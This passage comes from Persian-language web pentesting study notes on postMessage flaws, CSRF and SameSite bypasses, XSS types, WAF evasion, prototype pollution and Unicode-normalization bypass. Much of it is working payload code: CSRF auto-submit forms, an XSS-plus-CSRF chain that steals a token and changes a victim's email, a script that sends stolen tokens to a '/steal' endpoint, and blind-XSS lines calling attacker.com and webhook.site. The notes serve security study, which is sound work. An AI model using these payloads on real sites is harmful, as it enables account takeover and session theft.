            if (data.type === 'login') {
                document.getElementById('user-info').innerHTML =
                    `✅ Logged in as: ${data.username}`;
                document.cookie = `session=${data.token}`;
                console.log('📥 Received login data:', data);
            }
        });
    </script>
</body>
</html>
```

**Child (auth.shop.com/login):**
```html
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
    <h2>🔐 Login</h2>
    <input type="text" id="username" placeholder="Username" value="test_user">
    <input type="password" id="password" placeholder="Password" value="123456">
    <button onclick="sendLoginData()">Login</button>
    <script>
        function sendLoginData() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const data = {
                type: 'login',
                username: username,
                password: password,
                token: 'TOKEN_' + Math.random().toString(36).substr(2)
            };
            window.opener.postMessage(JSON.stringify(data), '*');
            alert('✅ Login data sent to parent!');
            window.close();
        }
    </script>
</body>
</html>
```

**VULNERABILITY:** در قسمت Child، کانفیگ اشتباه:
```javascript
window.opener.postMessage(JSON.stringify(data), '*');
```
`'*'` یعنی این دیتا برای *همه‌ی* parentها و صفحاتی که این child توشون باز شده ارسال می‌شه. با ساخت صفحه‌ی جعلی و کشوندن قربانی به سایت خودمون، و باز کردن child (چه IFRAME چه popup)، می‌تونیم اطلاعات رو بدزدیم.

> [!warning] چرا Regex کافی نیست
> چون تو این قسمت (targetOrigin در `postMessage`) نمی‌شه regex تعریف کرد — باید بعد از ساخت یک دیکشنری یا لیست، map کرد دونه‌دونه و بعد validation، دیتا رو ارسال کرد.
> 
> در قسمت چک کردن **Origin دریافتی** (`event.origin`) توانایی ست شدن regex هست، از طریق فایل JS یا فانکشن تو خود کد. اگه دامنه‌ی اصلی صرفاً ست شده باشه توی regex (**Bad Regex**) و تمام ساب‌دامنه‌ها و ... رو مجاز شمرده باشه، می‌شه با خرید یک دامنه که دامنه‌ی اصلی بخشی از اونه، regex رو دور زد.

**Exploit:**
```html
<button onclick="steal()">Click me</button>
<script>
    function steal() {
        const popup = window.open('http://auth.shop.com/login', '_blank');
        window.addEventListener('message', function(event) {
            if (event.origin === 'http://auth.shop.com') {
                alert('Stolen: ' + event.data);
            }
        });
    }
</script>
```

---

## سناریوهای بیشتر PostMessage (ch06)

### سناریوی ۱: Bad Regex + رمزنگاری قابل دور زدن
یک سایت parent اطلاعات رو برای child می‌فرسته و child همونو reflect می‌کنه. توی سایت child، origin ستاره (`*`) هست. رمزنگاری/encode/replace در سایت parent با JS اتفاق می‌افته — **خطرناک، چون از توی کنسول مرورگر می‌شه دورش زد.**

**Exploit (کاربر رو به سایت خودمون میاریم):**
```html
<!DOCTYPE html>
<html>
<head><title>postMessage iframe exploit</title></head>
<body>
    <h2>postMessage Exploit (iframe)</h2>
    <iframe src="http://185.7.212.119/xss/postmessage/basic/child/challenge"
        id="child_page"
        style="display:none">
    </iframe>
    <script>
    function start_game() {
        send_username();
    }
    function send_message(message) {
        document.getElementById("child_page").contentWindow.postMessage(message, "*");
    }
    function send_username() {
        const message = `user:<img src=1111onerror=alert(location.origin)>`;
        send_message(message);
    }
    setTimeout(() => {
        start_game();
    }, 2000);
    </script>
</body>
</html>
```

**Pro Tip:** برنامه‌نویس ممکنه دامنه رو درست ست کنه ولی ساب‌دامنه‌ها رو با regex بررسی کنه و این regex اشتباه ست شده باشه (Bad Regex). با در نظر گرفتن این سناریو که سایت فقط هاست اصلی رو چک می‌کنه، با خرید یک هاست مثل `target.attack.hacker.com`، می‌شه regex رو دور زد. حتی اگه کامل ست شده باشه، می‌شه با سایت‌هایی که توی لیست معتبر هستن چک کرد و روی اونا تست کرد و با اونا **Chained Attack** به سایت اصلی زد.

### سناریوی ۲: SSO Token Leak از طریق `*`
```
login target.com -> sso.target.com (login) -> sends token to target.com
```
در یک وبسایت لاگین می‌کنی که یک پاپ‌آپ/صفحه‌جدید/iframe باز می‌کنه؛ اونجا لاگین می‌کنی، بعد از authorize شدن یک توکن تاییدیه برای صفحه‌ی اصلی ارسال می‌شه:

```
target.com => منتظر دریافت postMessage می‌مونه
sso.target.com => توکن رو ارسال می‌کنه
sso.target.com => postMessage(token, "*")
```

توی کدش `"*"` ست شده — این misconfiguration باعث می‌شه توکن برای *هرکسی* که به این child کانکت شده، بدون validation و authorization ارسال بشه — با گوش‌دادن (listen کردن) می‌شه توکن رو دزدید.

> [!note] نکته درباره‌ی `window.parent.postMessage`:
> اگه تب جدید باز بشه و iframe نباشه، parent چایلد ما می‌شه آدرس همون child و نمی‌شه بدون استفاده از iframe درخواست بزنیم — یعنی با:
> ```javascript
> document.getElementById("child_page").contentWindow.postMessage(message, "star");
> ```
> نمی‌شه. یعنی در صورت `*` بودن، صرفاً کافیه کد parent رو کپی کنیم و اصلاً سختی خاصی نداره در صورت آسیب‌پذیر بودن.

## جمع‌بندی آسیب‌پذیری‌های PostMessage

**آسیب‌پذیری‌ها:**
۱. چک نشدن Origin فرستنده
۲. ارسال دیتا به تمامی parentها (`*`)
۳. ارسال دیتا به parentهای نام‌برده‌شده ولی با Bad Regex
۴. دریافت اطلاعات با Bad Regex

**اکسپلویت‌های ممکن:**
۱. XSS (Cross-Site Scripting)
۲. Data Hijacking
۳. CSRF (Cross-Site Request Forgery)
۴. Clickjacking
۵. Denial of Service (DoS)
۶. Information Leakage
۷. Session Hijacking
۸. DOM Manipulation
۹. Chained Attacks

---

# بخش ۷ — CSRF (Cross-Site Request Forgery)

انجام یک عمل به‌جای قربانی (مثل ادمین که پست حذف می‌کنه، ...) ولی ما وادارشون می‌کنیم این کارو بکنن.

**نکته کلیدی:** CSRF فقط ارسال (Send) است، نه دریافت (Get).
- پیام از طریق form، img، script، iframe و ... ارسال می‌شه
- Session و Cookie به‌صورت خودکار توسط مرورگر ارسال می‌شن
- آیا AJAX به‌طور پیش‌فرض این کارو می‌کنه؟ نه — باید `withCredentials: true` باشه
- `SameSite` جلوی form/iframe رو می‌گیره

**نمونه سناریوهای CSRF:** Reset Password، Email تغییر، آپلود عکس پروفایل، تغییر شماره موبایل

**نکته‌ی پایه:** `hacker.com → ارسال برای قربانی → (HTML Form یا AJAX) → https://target.com/changeEmail`
فقط عملکردهایی که *بعد از لاگین* هستن آسیب‌پذیرن، وگرنه CSRF معنی نداره.

## روش کشف CSRF (Discovery Methodology)

**Step 1 — Login**
وارد اکانت تست بشو.

**Step 2 — چک کردن Authentication Type**
Auth cookie رو چک کن؛ `SameSite` باید `None` باشه. **نوع Authentication باید Cookie-Based باشه** — اگه Header-Based (Token-Based) باشه، CSRF اصلاً قابل زدن نیست.
```
authorization: bearer yechizi  → این یعنی Token/Header-Based → آسیب‌پذیر نیست معمولاً
```
> اگه توکن هم تو کوکی هم تو هدر بود، هدر رو پاک کن ببین چی می‌شه — اگه درخواست رفت یعنی دور زده شده.
> توکن حتی می‌تونه در Body درخواست باشه: `newEmail=reza2@yahoo.com&tk=asfgtqeryqtertqeryqy` — اگه روش XSS پیدا کنیم، می‌تونیم با AJAX/Fetch این توکن رو بدزدیم و CSRF رو عملی کنیم.

**Step 3 — چک کردن Simple Request بودن**
اگه Content-Type از نوع JSON باشه، Preflight می‌شه (که جلوی CSRF ساده رو می‌گیره). باید Preflight رو تبدیل به Simple Request کرد:
- تغییر Content-Type از JSON به form/html
- حذف هدری که باعث Preflight می‌شه، **درصورتی‌که اون هدر اجباری نباشه** (اگه با/بدون اون هدر رفتار فرق کنه، آسیب‌پذیری زده نمی‌شه)

> [!note] نکته
> اگه بتونی هدر رو تغییر بدی و اونی که باعث Preflight می‌شه رو نفرستی و درخواست همچنان اوکی بشه، بازم آسیب‌پذیره.

**Step 4 — کار با Functionality و چک کردن CSRF Token**
با سایت کار کن تا بفهمی کجاها اطلاعات از طریق کوکی در حال Change شدنه (مثل `https://victim.com/changeEmail`).

## Low-Level CSRF
```html
<form id="csrf" action="https://target.com/change-password" method="POST">
    <input type="hidden" name="new_password" value="hacker123">
    <input type="hidden" name="csrf_token" value=""> <!-- if needed -->
</form>
<script>
    document.getElementById("csrf").submit();
</script>
```
چون کلاینت وارد سایت می‌شه و متوجه می‌شه که درخواست داره ازش زده می‌شه.

## Advanced CSRF (با iframe مخفی)
```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form id="csrf" action="https://target.com/change-password" method="POST" target="csrf_iframe">
    <input type="hidden" name="new_password" value="hacker123">
    <input type="hidden" name="csrf_token" value=""> <!-- if needed -->
</form>
<script>
    document.getElementById("csrf").submit();
</script>
```
اگه کوکی‌ها روی SameSite ست شده باشن، با iframe دور زده می‌شه.

## نمونه POC واقعی (از یک لبِ واقعی)
```html
<html>
<head><title>CSRF POC</title></head>
<body>
<form id="myForm" class="login-form" name="change-email-form" action="https://0a7400a90394927c829f164a00cf0063.web-security-academy.net/my-account/change-email">
    <label>Email</label>
    <input required="" type="email" name="email" value="bingo@test.com">
<input required="" type="email" name="csrf-token" value="XXXXXX">
    <button class="button" type="submit"> Update email </button>
</form>
<script>
document.forms["myForm"].submit();
</script>
</body>
</html>
```

## CSRF Protection
- Custom Header → حتی static — چون Preflight می‌شه و درخواست drop می‌شه اگه Allow نشه
- Body
- Nonce → CSRF Token در Body (مثل فرم‌های WordPress)
- بر اساس هر validation کاربر، Session یا Token اضافه ست می‌کنیم که وقتی توکن میاد سمتت، ببینی Parent یا Session Authenticationی که همراهش اومده مال همون یوزره یا نه — که حتی اگه با دزدیدن Token هم expire نشه، دور نمی‌شه زدش.

## Bypass CSRF Protection
- **دیکد کردن Token در صورت رمزنگاری بودن:** مثلاً اگه `csrf-token = base64(username)` باشه، یعنی توکن صرفاً Base64 خودِ username است — کافیه `admin` رو Encode کنی و هک کنی
- **حذف کامل Token:** `csrf-token=RANDOM` → `Delete CSRF-Token` — تا ببینی اصلاً حضورش تاثیری داره یا نه
- **خالی گذاشتن مقدار Token:** `csrf-token=`
- **حذف مقدار Token:** `$token=654665156` → `$token=""`
- **حذف کامل فیلد Token:** `$token = 684649684` → حذف کامل
- **گذاشتن یک مقدار معتبر (Not Expired):** یا توی همه‌ی درخواست‌ها همون توکنی که می‌دونستی واقعاً معتبره رو بذاری — درصورتی‌که expire نشه دور می‌زنه
- **Verb Tampering (تغییر Method):** روش قدیمی‌ای ولی روی سازمان‌ها شاید هنوز جواب بده — مثلاً:
  ```
  POST /changeINFo http/1.1
  HOST: yechizivictim.com
  newName=reza&_requestToken=fhwghwyjru
  ```
  تست می‌کنیم ببینیم GET چه پاسخی می‌ده:
  ```
  GET /changeINFo?newName=reza3 http/1.1
  HOST: yechizivictim.com
  ```
- **تست کردن توکن اکانت دیگه:** توکن اکانت خودت رو با توکن اکانت دیگه جایگزین کن، ببین چی می‌شه (آیا سرور اصلاً مالکیت Token رو با Session چک می‌کنه یا نه)
- **الگوریتم** (نیاز به تحقیق بیشتر)

سؤال باز: چطور Token رو در Body پیدا کنیم؟ (نیاز به تحقیق)

## Bypass با حملات دیگر
- CORS
- XSS

> [!warning] نکته
> CSRF خیلی وقته از OWASP Top Ten خارج شده و دیگه به‌راحتی نمی‌شه زدش — هم Frameworkها هم ابزارهای زیادی جلوشو گرفتن.

## SameSite Bypass (تکنیک‌های عملی)

### Bypass حالت `Lax`
در `Lax`، فقط متود `GET` مجازه (SameSite این حالت رو اجازه می‌ده). اگه بتونی متود رو به GET تبدیل کنی و درخواست اعمال بشه، توانایی دور زدن SameSite رو داری.

گاهی سرور مستقیم متود GET رو Not Allowed می‌ده؛ برای دور زدنش کافیه در URL این پارامتر رو اضافه کنی: `..._method=post` و اینو با متود GET بفرستی. یا برعکس:

فرض کن endpoint واقعی PATCH می‌خواد:
```
PATCH /changeemail
newemail=newemail@yahoo.com
```
می‌خوایم این رو با POST انجام بدیم (چون POST با فرم/GET راحت‌تر ساخته می‌شه):
```
POST /changeemail
newemail=newemail@yahoo.com&_method=PATCH
```
و اینطوری Bypass می‌کنیم.

### Bypass حالت `Strict`
باید دنبال یک Endpoint با متود GET بگردیم و با **Open Redirect** دورش بزنیم:
```
https://example.com?redirect=https//example.com/changhemail
```
منطق: یوزر ابتدا وارد سایت اول می‌شه (کوکی نمی‌ره چون هنوز Cross-Site محسوب می‌شه)، ولی با ریدایرکت دوم، درخواست از داخل خودِ `example.com` به `example.com` می‌ره — یعنی Same-Site برقراره و کوکی ارسال می‌شه.

باید چک کنیم آیا Redirect ما با URL کامل (`http...`) صورت می‌گیره یا با یک Path نسبی:
```
https://example.com?postid=/section/2/OURurlWITHOUThttp
```
یعنی مسیر داخل پارامتر قرار گرفته — با اضافه کردن Path Traversal می‌شه به Endpoint هدف رسید:
```
https://example.com?postid=/section/2/../../the path of changing email with credentials
```

---

## XSRF + XSS Chaining (اکسپلویت کامل)

همونطور که می‌دونیم، توکن CSRF که تو هدر ماست معمولاً در بدنه‌ی صفحه هم وجود داره، مثلاً:
```
https://victim.com/profile → csrf-token تو بدنش هست
```
کافیه اسم یا خودِ توکن رو در Tab اینسپکت (Elements) چک کنی.

**سناریو:** اگه روی هر صفحه‌ای که این توکن رو نمایش می‌ده XSS پیدا کنیم (چه Reflected، چه Stored، چه DOM) — مثلاً:
```
https://victim.com/search?q=YECHIZI
```
— می‌تونیم با AJAX توکن رو از صفحه‌ی `/myaccount` بدزدیم و بلافاصله با یه AJAX دوم، عملیات CSRF (مثل تغییر ایمیل) رو با همون توکن انجام بدیم.

### کد کامل اکسپلویت
```javascript
<script>
var xhttp = new XMLHttpRequest();
xhttp.responseType = "document";
xhttp.onload = ()=>{
    token = xhttp.response.getElementsByName("csrf")[0].value;
    xhttp2 = new XMLHttpRequest();
    xhttp2.withCredentials = true;
    xhttp2.open("POST", "https://0a1a0048044efa0481458e60006f00af.web-security-academy.net/my-account/change-email");
    xhttp2.send("email=newExploit@gmail.com&csrf="+token);
}
xhttp.open("GET", "https://0a1a0048044efa0481458e60006f00af.web-security-academy.net/my-account");
xhttp.send()
</script>
```
منطق: اول با `withCredentials`/کوکی قربانی، صفحه‌ی `/my-account` رو می‌خونیم (چون قربانی لاگینه، کوکیش خودکار می‌ره)، توکن CSRF رو از داخل DOM اون رسپانس استخراج می‌کنیم، و بلافاصله با همون توکن یک درخواست POST برای تغییر ایمیل می‌فرستیم — همه‌چیز خودکار و بدون نیاز به دیدن قربانی.

---

# بخش ۸ — XSS: انواع و مکانیزم

## Cross-Site Scripting — انواع

| نوع | توضیح | مثال |
|---|---|---|
| **Reflected** | کاربر باید روش کلیک کنه تا انجام بشه | `.../search?q=<script>alert(1)</script>` |
| **Stored** | ذخیره می‌شه در Body و برای همه اجرا می‌شه | `.../user?email=<script>alert(1)</script>` |
| **DOM-based** | JS منتظر دریافت ورودی هستش و در DOM اجرا می‌شه؛ سخت‌تر برای پیدا کردنه | Source/Sink — لیست کامل در بخش ۱ |
| **Blind** | نمی‌بینیش مستقیم — مثلاً در پشتیبانی و پیام به ادمین | استخدام، اعتراض به نمره، افزایش حقوق، Feedback، Contact Us |
| **Self** | لاگین کردی و تو یه جایی مثل Bio تونستی بزنی | باید Chain بشه با حمله‌ی دیگه (مثل CSRF) که XSS رو روی Bio کاربر دیگه بزنی و دیتاشو بدزدی |

## تفاوت دقیق جریان (Flow) بین انواع XSS

- **Reflected:** حتماً سمت Backend می‌ره و رسپانس به‌صورت آسیب‌پذیر برمی‌گرده:
  `https://target.com/search?q=PayloadJSInject → backend → return → response`
- **DOM:** ممکنه سمت سرور بره یا نره — اصلاً مهم نیست بره یا نه؛ تنها چیزی که مهمه اینه که با Source دریافت بشه و با Sink اجرا بشه:
  `https://target.com/search?q=PayloadJSInject → response → source → sink execute`
- **Stored:** مثال جریان: `Register → firstname → /profile`

> [!warning] تشخیص Reflected در برابر DOM
> XSSهای Reflected در View-Source قابل دیدن هستن. ولی DOM XSS ها **نه** — چون View-Source محتوای صفحه رو *قبل* از اجرای فانکشن‌های JS و شکل‌گیری DOM نشون می‌ده. (یعنی اگه پیلود از طریق Sink دام‌بیسد اجرا بشه، تو View-Source اصلاً دیده نمی‌شه.)
> 
> نکته‌ی جانبی: origin بخشی از خود Document نیست.

### Blind XSS — جاهای رایج و روش عملی

جاهای رایج: Feedback، Contact Us، استخدام، اعتراض به نمره، افزایش حقوق — هرجایی که ورودی می‌دی ولی مستقیم نمی‌بینیش. سایت برای دیدن بازخورد غیرمستقیم: **xsshunter.com / webhook.site**

**روش عملی: تزریق دو مرحله‌ای**
قبل از تزریق پیلود اصلی Blind XSS، اول باید مطمئن بشیم اصلاً HTML Injection ممکنه — یه پیلود ساده‌ی Out-of-Band (که فقط یه Request به سرور خودمون می‌زنه، بدون اجرای کد پیچیده) می‌فرستیم:
```html
reza'"><img src="https://webhook.site/915f4313-1de9-4060-9c99-214ca98be976">
```
اگه این Request به Webhook رسید، یعنی HTML Injection داریم — بعدش پیلود واقعی XSS رو تزریق می‌کنیم:
```html
reza'"><script>i = new Image; i.src="https://attacker.com/bankReq"</script>
```
یا نسخه‌ی ساده‌تر بدون کوتیشن اضافه:
```html
'"><img src=https://webhook.site/915f4313-1de9-4060-9c99-214ca98be976>
```
درخواست در نهایت در لاگ‌های یک سرور دیگه (سرور خودمون / Webhook) ثبت می‌شه — این تایید اجرای پیلود روی سیستم قربانیه (مثلاً ادمینی که تیکت رو باز کرده).

### DOM-based XSS — Source و Sink کامل

**Source:**
- `document.url`
- `document.document`
- `document.documentURI`
- `history.pushState`
- `location`
- `document.referrer`
- `history.replaceState`

**Sink:**
- `location`
- `postMessage`
- `document.title`
- `document.search`

> [!note] نکته
> ابزارها در شناسایی DOM XSS به‌شدت ضعیفن.

---

# بخش ۹ — XSS: کشف و اکسپلویت (Practice)

## پیدا کردن XSS
- Input Values
- و سایر روش‌های recon (بخش ۱۱)

## Practice: تزریق XSS و دزدیدن Token از صفحه‌ی دیگر
سناریو: سایتی که قربانی توش لاگینه رو با XSS + XHR می‌خونیم و توکنش رو می‌دزدیم:
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.responseType = "document";
xhr.open("GET", "http://127.0.0.1:5000/csrf", true);
xhr.onload = function() {
    if (xhr.status === 200) {
        var tokenElement = xhr.response.getElementById("token");
        if (tokenElement) {
            var token = tokenElement.value;
            var steal = new XMLHttpRequest();
            steal.open("GET", "http://127.0.0.1:5500/steal?token=" + encodeURIComponent(token), true);
            steal.send();
            alert("Token stolen and sent to hacker!");
            console.log("Stolen Token: " + token);
        }
    }
};
xhr.send();
</script>
```
کافیه این رو تو سرور هکر و در یک فایل JS بذاریم و با XSS آپلودش کنیم — اطلاعات تارگت دزدیده می‌شه.

### تمرین پایه‌ی XHR با Credentials
```javascript
xhttp = new XMLHttpRequest;
xhttp.withCredentials = true;
xhttp.open("GET","https://target.com");
xhttp.send();
```

## اگه Script Tag فیلتر بود چطوری بسازی؟
اگه بخوایم مطمئن بشیم چه اتفاقی برای ورودیمون می‌افته و کجا تغییر می‌کنه، باید JS صفحه رو بخونیم — مثلاً اگه `=` فیلتر می‌شد، Encode کن و تو URL بذار.

```html
<img src%3d111 onerror%3d"var script%3d document.createlement('script');script.src%3d(hackerurl-js file path);document.queryselector('body').appendchild(script)
```
اینطوری تو بدنه اسکریپت می‌سازی و توش دیتای سایت هکره.

## WAF Bypass: تکنیک‌های ساخت رشته (String Building)

وقتی WAF به رشته‌های خاصی حساسه:

- **Base64:** `atob | btoa`
- **Octal**
- **Hex**
- **Unicode:** می‌تونی به‌جای `\u00XX` از `\u{XX}` استفاده کنی — این فرم برخلاف بقیه، برای فانکشن‌ها هم کار می‌کنه
- **ASCII**
- **ترکیب همه با هم:** `"\162\u0056z\x61"` → `\162` اکتال، `\u0056` یونیکد، `z` نرمال، `\x61` هگز

> همه‌ی این‌ها فقط رشته می‌سازن و به خودی خود ارزشی ندارن — نحوه‌ی سوءاستفاده از این رشته‌ها موضوع بخش‌های بعدیه.

- `String.fromCharCode(122,155,...)` → تبدیل کد ASCII به حروف
- **دور زدن فیلتر `+`:**
```javascript
a = "ale"
b = "rt(10)"
a+b  // اگه سایت به "+" حساس باشه:
a.concat(b)  // "alert(10)" — ولی خروجی همچنان یه رشته‌ست
```

## WAF Bypass: دور زدن پرانتز `()`
- به‌جای `()` از دو Backtick استفاده کن (Template Literal call)
- `onerror=alert;throw"ssss"` → بدون پرانتز alert می‌شه؛ توی document کار نمی‌کنه ولی توی stored می‌شه
- `throw onerror=alert;"1616 ", "65561", "156157"`

## کامنت‌ها در JS
- `//` تک‌خطی
- `/* ... */` چندخطی

## Function Blacklist و جایگزین‌ها
- `eval` → `eval(<string>)` مثل `eval("hello")` یا `eval("\162\u0056z\x61")`
- گاهی `eval` فیلتر می‌شه؛ معادل‌هاش:
  - `setTimeout`
  - `setInterval`
  - `Function`:
    - `(function("alert(1)"))()`
    - `Function("alert(1)")` + دو backtick

## دور زدن `.` (Dot) در فیلتر
اگه نتونی `document.cookie` بنویسی:
```javascript
document["cookie"]
```

## استفاده از window به‌جای دسترسی مستقیم
```javascript
window.alert(10)
window["alert"](2)
```
مثل window: `this`, `top`, `self`, `parent`

## تکنیک Find/Filter برای اجرای تابع بدون نام مستقیم
```javascript
(document.cookie).find(prompt, alert, ...)
```
شبیه find: `map`, `foreach`, `filter`
مثال ترکیبی:
```javascript
["aaaa"].filter(window["alert" /* یا هر رشته دیگه */])
```

## زبان‌های Encoding مرتبط (نیاز به تحقیق)
- UTF-7, UTF-6, UTF-32
- HTML Encode: `&` → `&amp;`
- اگه `&&` فیلتر بشه: `&&amp;` → آسیب‌پذیر

---

## Prototype Pollution → XSS

### مفهوم `__proto__`
در JS، امکان ساخت و اضافه کردن صفات/توابع برای هر Data Type از طریق `__proto__` وجود داره:
```javascript
var a = {};
var b = {};
b.__proto__.newvalue = "admin";
a.newvalue // => "admin"
```
چرا وقتی برای `b` مقدار `__proto__` جدید تعریف کردیم، برای `a` هم اعمال شد؟ چون هر دو از نوع object/dict هستن و این تغییر باعث میشه یک صفت جدید در **کلاس اصلی** (Prototype مشترک همه‌ی Objectها) به‌وجود بیاد که روی همه‌ی dict/objectها اعمال می‌شه. یعنی در اصل `__proto__` والد در ارث‌بریه، و `a`, `b` فرزندهایی هستن که این صفت رو ارث‌بری کردن.

### Prototype Chain (چطور موتور JS مقدار رو پیدا می‌کنه)
```javascript
var person1 = {name:"mobin", lastname:"mns", age:22, job:"pentester"}
var person2 = {name:"jordan", lastname:"shahi", age:50, job:"doctor"}
```
- `person1.name` → مستقیم تو خودِ object پیدا می‌شه → `mobin`
- `person1.salary` → چون تو خودِ object نیست، اگه با `person1.__proto__.salary` مقدار بدیم، به **Prototype** آبجکت‌ها این ویژگی اضافه می‌شه — و اگه ویژگی روی خودِ شیء پیدا نشه، موتور JS در **Prototype Chain** جستجو رو ادامه می‌ده تا بهش برسه.

می‌شه با همین روش تابع هم تعریف کرد:
```javascript
a.__proto__.greeting = function(){ return("hi there ") + this.name}
person1.greeting()
```

### آسیب‌پذیری کجاست؟
وقتی برنامه‌نویس روی متغیر/ابجکتی که ساخته، یک Custom Function اجرا می‌کنه — بدون اینکه مقدار پیش‌فرضش رو Set کرده باشه:
```javascript
https://example.com#mobin
a = {}
b = { hash: location.hash }
smth.innerHTML = b.hash
```

### مثال کامل اکسپلویت XSS با Prototype Pollution
یه سورس جالب فرضی:
```javascript
if(test.js) {
    let script = document.createElement('script');
    script.src = config.transport_url;
    document.body.appendChild(script);
}
```
اگه سایت Prototype Pollution بخوره و برنامه‌نویس قبل از این قطعه کد مقدار `config.transport_url` رو Set نکرده باشه، با ایجاد این:
```javascript
__proto__.transport_url = alert(10)
// یا
__proto__[transport_url] = alert(10)
```
می‌تونی XSS بزنی.

> [!warning] نکتهٔ فنی
> اگه ورودی XSS به این شکل باشه `alert(10)2` کار نمی‌کنه، ولی اگه `alert(10)+3` باشه کار می‌کنه — پس اگه جایی پیلود زدی و عدد ناخواسته کنارش اضافه شد، `+` رو Encode کن تا Bypass بشه.

### Prototype Pollution در URL
همین آسیب‌پذیری از طریق Query String هم قابل انجامه:
```
https://example.com?__proto__.example="value"
```
یا
```
https://example.com?__proto__[example]="value"
```

---

# بخش ۱۰ — کجاها XSS اجرا می‌شه (Sink Contexts کامل)

۱.
```javascript
<img src = javascript:alert(10)>
```
۲.
```javascript
<iframe src = javascript:alert(10)>
```
۳. (تکرار مشابه با iframe)
۴.
```javascript
<a href = javascript:alert(10)>
```
۵.
```javascript
<iframe src="data:text/html,<svg onload=alert(1)>">
```
۶.
```javascript
<iframe/src="data:text/html;base64,[base64 encoded xss]">
// اگه به اسپیس گیر داد از / استفاده کن
```

> مثال‌های آخر صرفاً برای iframe نیستن — نمونه‌ای هستن از اینکه اگه ورودی در `src` بنشینه چه کارهایی می‌شه کرد.

> [!warning] نکتهٔ مهم
> `<a href=javascript:alert(10)>` یکی از مهم‌ترین تکنیک‌هاست، چون اگه اسکریپت توش بشینه مثل ریدایرکت عمل می‌کنه.

## سناریوی واقعی: SSO با URL Redirect Injection
یک شرکت SSO موقع لاگین این URL رو می‌فرسته:
```
.../login?token=[smth random]&url=[xss payload + ajax]
.../resetpassword?token=[smth random]&url=[xss payload + ajax]
```
که شامل:
- number → `09xxxxxxx`
- checking code
- reset → به تارگت ارسال می‌شه

توکن‌ها انقضای زمانی نداشتن و فقط با مصرف از بین می‌رفتن؛ سناریو دادن لینک به یوزر هستش.

## کجاها XSS کار نمی‌کنه (و باید تگ رو ببندی)

| Context | راه‌حل |
|---|---|
| `<title> input </title>` | باید: `<title></title>input<title></title>` |
| `<noscript> input </noscript>` | باید: `<noscript></noscript> input <noscript></noscript>` |
| `<script> input </script>` | باید: `<script></script> input <script></script>` |
| `<textarea> input </textarea>` | (نیاز به تکمیل) |

---

# بخش ۱۱ — ابزارهای XSS و Recon Automation

## External Recon
- شناسایی ساب‌دامنه‌ها (`everything.website.com` in scope)
- یونیک کردن نتایج
- چک کردن اینکه Up هستن یا نه
- **ابزارها:** subbrute, amass, google dork, shodan, **github dork** (خیلی مهم — ممکنه دولوپر چیزی رو جا گذاشته باشه), massdns (نیاز به تحقیق)

## Internal Recon
- پیدا کردن directory / file / parameter
- **ابزارها:** ferox buster, arjun, ffuf, waybackurl, hackrawler, paramspider, **gf** (دیتاهای جمع‌آوری‌شده رو بهش می‌دی و پتانسیل آسیب‌پذیری رو نشون می‌ده)

## Check Reflect XSS
- kxss, gxss, paramspider, arjun

## Exploit XSS
- xsstrike, dalfox, xssor

> [!note] نکته
> ابزارها در شناسایی DOM XSS به‌شدت ضعیفن.

Automation زمانی قوی می‌شه که همه‌ی این‌ها رو با Python یا Bash خودکار کنی، دیتاها رو ذخیره و یونیک کنی، و به‌صورت آرگومان به ابزارهای دیگه بدی.

---

# بخش ۱۲ — XSSI (Cross-Site Script Inclusion)

ذخیره‌ی دیتای داینامیک در JS خطرناکه چون خود کاربر باعث ساختنش شده و با عملیاتش شکل گرفته. اینکلود کردنش در تگ باعث اکسپلویت می‌شه.

فایل‌های XSS‌ای که به‌صورت اتوماتیک ساخته می‌شن (مثلاً در برنامه‌هایی مثل Burp اطلاع داده می‌شه از وجودشون) داینامیک هستن چون با فعالیت کاربر ساخته می‌شن — پس اطلاعات مهمی توشونه.

برنامه‌نویس می‌تونه با ست کردن هدرهایی مثل `X-Content-Type-Options: nosniff` جلوی این اتفاق رو بگیره — جلوگیری از اینکلود شدن فایل در JS سایت دیگه، مثل:
```javascript
<script src=target.com>
```

---

# بخش ۱۳ — Unicode Normalization (WAF Bypass پیشرفته)

## Normalization چیست؟
بخشی از Unicode که ورودی ما رو Code Point می‌کنه برای یکسان‌سازی ورودی‌ها. مثال: یک سایت بین‌المللی به کاربران فرانسوی اجازه می‌ده با حروف خودشون لاگین کنن، ولی در دیتابیس نهایتاً به انگلیسی Encode و ثبت می‌شن.

## انواع Normalization
۱. Canonical
۲. Compatibility

## الگوریتم‌های Normalization
۱. ASCII
۲. NFC
۳. NFKC
۴. NFKD

## مراحل تست Normalization
۱. برو تو سایت: `appcheck-ng.com/wp-content/uploads/unicode_normalization.html`
۲. از حرف `k` شروع کن — اگه Decode و تبدیل شد یعنی Normalization در حال اتفاق افتادنه
۳. با مثال‌های زبان‌های مختلف تست کن تا به نتیجه‌ی دقیق برسی
۴. توی XSS از آرگومان‌های همون زبون استفاده کن

## مثال کامل: زدن XSS با Normalization Bypass

کد سایت هدف (Flask):
```python
from flask import Flask, abort, request
import unicodedata
from waf import waf

app = Flask(__name__)

@app.route('/')
def Welcome_name():
    try:
        name = request.args.get('name')
    except:
        return '<head><title>Bypass waf-JS-For-BugHunter</title></head><form method="GET" action="/">...'

    if(name):
        if waf(name):
            abort(403, description="XSS Detected")
        else:
            name = unicodedata.normalize('NFKD', name)  # NFC, NFKC, NFD, and NFKD
            return '<head><title>...</title></head>Welcome to ravinAcademy : ' + name
    else:
        return '...'

if __name__ == '__main__':
    app.run(host='185.7.212.119', port=81)
```

WAF مربوطه:
```python
def waf(input):
    print(input)
    blacklist = ["-", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "=", "{", "}", "[", "]", "|", "\\", ":", ";", "\"", "'", ",", ".", "/", "?", "`", "~", "<", ">"]
    vuln_detected = False
    if any(string in input for string in blacklist):
        vuln_detected = True
    return vuln_detected
```

کافیه آرگومان‌های فیلترشده رو Encode کنی!

> [!danger] ترتیب اشتباه فیلتر و Decode
> در این کد، ابتدا ورودی کاربر فیلتر می‌شه (`waf(name)`) و **سپس** Decode می‌شه (`unicodedata.normalize`) — درصورتی‌که باید ابتدا Decode بشه و سپس توسط WAF چک بشه. این ترتیب اشتباه، دقیقاً همون چیزیه که باعث Bypass می‌شه.

### مثال معروف مرتبط
لاگین با یوزر `Ⓐdmin` که در صورت Encode شدن در مرحله‌ی نامناسب، اطلاعات جدید به‌جای ادمین واقعی می‌شینه.

